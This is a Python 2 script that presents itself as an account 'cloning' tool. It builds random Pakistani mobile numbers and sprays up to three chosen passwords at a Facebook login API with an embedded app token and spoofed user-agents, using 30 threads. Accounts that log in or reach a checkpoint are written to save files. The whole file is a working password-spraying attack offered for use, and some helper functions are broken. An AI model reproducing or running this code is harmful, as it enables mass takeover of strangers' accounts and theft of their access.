#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(30000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 FAMOUS.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
br.addheaders = [('user-agent', 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/195.0.0.35.99;FBBV/128710103;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/129521611;FBCR/2degrees;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J250G;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]')]


def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)
def tik():
    titik = [
         '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[\033[1;32m✓\033[0m]\n']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading.. \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.1)
        
     


def lodhirt():
    lodhirt = [
          '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY', '\033[1;93mBRAND BOY', '\033[1;97mBRAND BOY']
    for o in lodhirt:
        print '\r\x1b[1;94m                  \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(1./17)




back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;37m───────────────────────────────────────────────
       \033[1;96m_____    ____      __  __   _____ 
     \033[1;96m / ____|  / __ \    |  \/  | |_   _|
    \033[1;92m | (___   | |  | |   | \  / |   | |  
    \033[1;92m  \___ \  | |  | |   | |\/| |   | |  
    \033[1;93m  ____) | | |__| |   | |  | |  _| |_ 
    \033[1;93m |_____/   \____/    |_|  |_| |_____|
\033[1;37m───────────────────────────────────────────────
"""

####Logo####

logo1 = """
\033[1;37m───────────────────────────────────────────────
       \033[1;96m_____    ____      __  __   _____ 
     \033[1;96m / ____|  / __ \    |  \/  | |_   _|
    \033[1;92m | (___   | |  | |   | \  / |   | |  
    \033[1;92m  \___ \  | |  | |   | |\/| |   | |  
    \033[1;93m  ____) | | |__| |   | |  | |  _| |_ 
    \033[1;93m |_____/   \____/    |_|  |_| |_____|
\033[1;37m───────────────────────────────────────────────
    

"""
logo2 = """
\033[1;37m───────────────────────────────────────────────
       \033[1;96m_____    ____      __  __   _____ 
     \033[1;96m / ____|  / __ \    |  \/  | |_   _|
    \033[1;92m | (___   | |  | |   | \  / |   | |  
    \033[1;92m  \___ \  | |  | |   | |\/| |   | |  
    \033[1;93m  ____) | | |__| |   | |  | |  _| |_ 
    \033[1;93m |_____/   \____/    |_|  |_| |_____|
\033[1;37m───────────────────────────────────────────────

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
"""     
BrandUsername = "SOMI"
BrandPassword = "BRAND"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;47m\033[1;31m             ✮ENTER BRAND NAME✮                \033[1;0m\n \n\033[1;93mEnter  :")
                                                     
    if (username == BrandUsername):
    	password = raw_input("\033[1;47m\033[1;31m           ✮ENTER BRAND PASSWORD✮              \033[1;0m\n \n\033[1;93mEnter :")
                                                         
        if (password == BrandPassword):
            tik()
            print "\033[1;92m\n \n\033[1;97m[\033[1;92m✓\033[1;97m] LOGIN COMPLETE NOW ENJOY WITH SOMI"
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWRONG PASSWORD \n YOU NEED CORRECT PASSWORD THEN \033[1;91m\nCONTACT\033[1;97m\n 03455453538"
            
            
    else: 
        print "\033[1;94mWRONG USERNAME \n YOU NEED CORRECT USERNAME THEN \033[1;91m\n CONTACT\033[1;97m\n 03455453538"
        
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    lodhirt()
    print
    print
    print 47* '\033[1;97m⁀'
    jalan('\x1b[1;91mTYPE \033[1;96m•A•\033[1;93m THEN START AUTO CRACKING\033[1;97m[MY CHOICE]')
    jalan('\x1b[1;91mTYPE \033[1;96m•B•\033[1;93m SUBSCRIBE YOUTUBE CHANNEL\033[1;97m[DONT FORGOT]')
    jalan('\x1b[1;91mTYPE \033[1;96m•Z•\033[1;93m THEN STOP PROGRAM ')
    print 47* '\033[1;97m‿'
    pilih_login()

def pilih_login():
    bch = raw_input('\n\n \x1b[1;96m>   ')
    if bch == '':
        print '[!] Fill in correctly'
        pilih_login()
    elif bch == 'A':
    	somi()
    	tik()
    elif bch == 'B':
    	tik()
        os.system('xdg-open https://youtube.com/channel/UCB2wevmMLX-RHh0phbOb-Ag')
    elif bch == 'Z':
        tik()
######SOMI#######
def somi():
    os.system('clear')
    print logo1
    lodhirt()
    print
    print
    print 47* '\033[1;97m⁀'
    jalan('\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]  \x1b[1;92mSTART CLONING ATTACK\033[1;0m\033[1;97m (Update Series)')
    jalan('\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]  \x1b[1;92mCLOSE \033[1;91mATTACK')
    print 47* '\033[1;97m‿'
    time.sleep(0.05)
    action()

def action():
    bch = raw_input('\n\n \x1b[1;96m>   ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
        os.system("clear")
        print logo1
        lodhirt()
        print
        print 47* '\033[1;97m⁀'
        print "\033[1;93mEnter any Pakistan Mobile code Number"+'\n'
        print '\033[1;97m☪Jazz☪ : \033[1;91m00,01,02,03,04,05,06,07,08'
        print '\033[1;97m☪Zong☪ : \033[1;92m11,12,13,14,15,16,17,18,??'
        print '\033[1;97m☪Warid☪ : \033[1;94m21,22,23,24,25,??,??,??,?'
        print '\033[1;97m☪Ufone☪ : \033[1;95m30,31,32,33,34,35,36,37,?'
        print '\033[1;97m☪Telenor☪ : \033[1;96m40,41,42,43,44,45,46,47,48,49'
        print 47* '\033[1;97m‿'
        try:
            c = raw_input("\033[1;93mChoose \x1b[1;92mNumber \033[1;94mCode: ")
            k=raw_input("\033[1;93mChoose \x1b[1;92mNumber \033[1;94mCode: ")
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input("\n[ Back ]")
            menu()
    elif bch =='0':
    	tik()
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47* '\033[1;97m‿'
    awan = raw_input('\033[1;93mEnter Password 1 : ')
    awann = raw_input('\033[1;94mEnter Password 2 : ')
    awannn = raw_input('\033[1;95mEnter Password 3 : ')
    print 47* '\033[1;97m⁀'
    xxx = str(len(id))
    jalan ('[+]\033[0;96m Total Pakistan ids:\x1b[1;93m '+xxx)
    jalan ('[+]\033[0;91m Total Password \x1b[1;94m    '+xxx)
    jalan ('[✓]\033[0;92m Code you choose\x1b[1;97m: '+c)
    jalan ("[✓]\033[0;93m Wait A While Start\x1b[1;92m Cracking...")
    jalan ("[!]\033[0;94m To Stop Process Press\x1b[1;93m Ctrl + Z")
    print 47* '\033[1;97m‿'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = awan
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m{Open \x1b[1;96mNow \x1b[1;91m} ⌯ \033[1;92m' + k + c + user + '\x1b[1;91m ⌯ \x1b[1;95m' + pass1                                       
                okb = open('save/successfull.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m{Aftar \x1b[1;97m7days\x1b[1;93m} \033[1;91m⌯\033[1;93m ' + k + c + user + '\x1b[1;91m  ⌯ \x1b[1;96m' + pass1
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = awann
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m{Open \x1b[1;96mNow \x1b[1;92m} \033[1;91m⌯ \033[1;92m' + k + c + user +  '\x1b[1;91m ⌯ \x1b[1;95m' + pass2
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m{Aftar \x1b[1;97m7days\x1b[1;93m} \033[1;91m⌯ \033[1;93m' + k + c + user + '\x1b[1;91m  ⌯ \x1b[1;96m' + pass2
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3 = awannn
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m{Open \x1b[1;96mNow \x1b[1;92m} \033[1;91m⌯ \033[1;92m' + k + c + user +  '\x1b[1;91m ⌯ \x1b[1;95m' + pass3
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m{Aftar \x1b[1;97m7days\x1b[1;93m} \033[1;91m⌯ \033[1;93m' + k + c + user + '\x1b[1;91m  ⌯ \x1b[1;96m' + pass3
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                                                                                          

        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print '\033[1;93mProcess Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
    

"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
if __name__ == '__main__':
    login()


